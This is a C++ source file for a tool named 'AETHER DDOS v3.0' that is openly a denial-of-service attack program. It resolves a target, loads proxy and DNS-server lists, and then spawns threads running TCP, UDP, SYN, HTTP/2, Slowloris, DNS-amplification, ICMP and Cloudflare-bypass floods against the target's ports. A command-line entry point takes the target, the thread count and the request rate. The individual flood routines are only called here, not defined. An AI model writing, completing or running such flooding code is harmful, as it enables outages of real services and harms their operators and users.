#include "aether_ddos.h"
#include <iostream>
#include <arpa/inet.h>
#include <netdb.h>
#include <chrono>

AetherDDoS::AetherDDoS(const std::string& target, int threads, int rate) 
    : threads(threads), rate_per_thread(rate / threads) {
    struct hostent* host = gethostbyname(target.c_str());
    if (!host) { log("[-] DNS resolve failed!"); exit(1); }
    target_ip = inet_ntoa(*(struct in_addr*)host->h_addr);
    target_port = 80;
    load_proxies("../payloads/proxies.txt");
    load_dns_servers("../payloads/dns_servers.txt");
    load_vuln_paths("../payloads/vuln_paths.txt");
    log("[*] AETHER DDOS v3.0 COSMIC ANNIHILATION: " + target_ip);
}

void AetherDDoS::launch_apocalypse() {
    log("[*] COSMIC ANNIHILATION LAUNCHED! " + std::to_string(threads*9) + " THREADS");
    std::vector<std::thread> thread_pool;

    // VULN SCANNER FIRST
    vuln_scanner();
    auto ports = auto_target();
    if (ports.empty()) ports.push_back(80);

    // LAUNCH ALL ATTACKS
    for (int i = 0; i < threads; ++i) {
        for (int port : ports) {
            target_port = port;
            thread_pool.emplace_back(&AetherDDoS::tcp_flood, this, i);
            thread_pool.emplace_back(&AetherDDoS::udp_flood, this, i);
            thread_pool.emplace_back(&AetherDDoS::syn_flood, this, i);
            thread_pool.emplace_back(&AetherDDoS::http2_flood, this, i);
            thread_pool.emplace_back(&AetherDDoS::slowloris, this, i);
            thread_pool.emplace_back(&AetherDDoS::dns_amp_flood, this, i);
            thread_pool.emplace_back(&AetherDDoS::botnet_sim, this, i);
            thread_pool.emplace_back(&AetherDDoS::icmp_flood, this, i);
            thread_pool.emplace_back(&AetherDDoS::l7_attack, this, i);
            thread_pool.emplace_back(&AetherDDoS::cf_bypass, this, i);
            thread_pool.emplace_back(&AetherDDoS::multi_proto, this, i);
        }
        thread_pool.emplace_back(&AetherDDoS::ai_optimizer, this, i);
    }

    // RUN FOR 30s (DEMO)
    std::this_thread::sleep_for(std::chrono::seconds(30));
    log("[*] ANNIHILATION STOPPED! GENERATING REPORT...");
    for (auto& t : thread_pool) { t.detach(); }
    generate_report();
}

void AetherDDoS::log(const std::string& msg) {
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << msg << std::endl;
    results.push_back(msg);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: ./aether_ddos <target> <threads> <req_per_sec>\n";
        return 1;
    }
    AetherDDoS ddos(argv[1], std::stoi(argv[2]), std::stoi(argv[3]));
    ddos.launch_apocalypse();
    return 0;
}
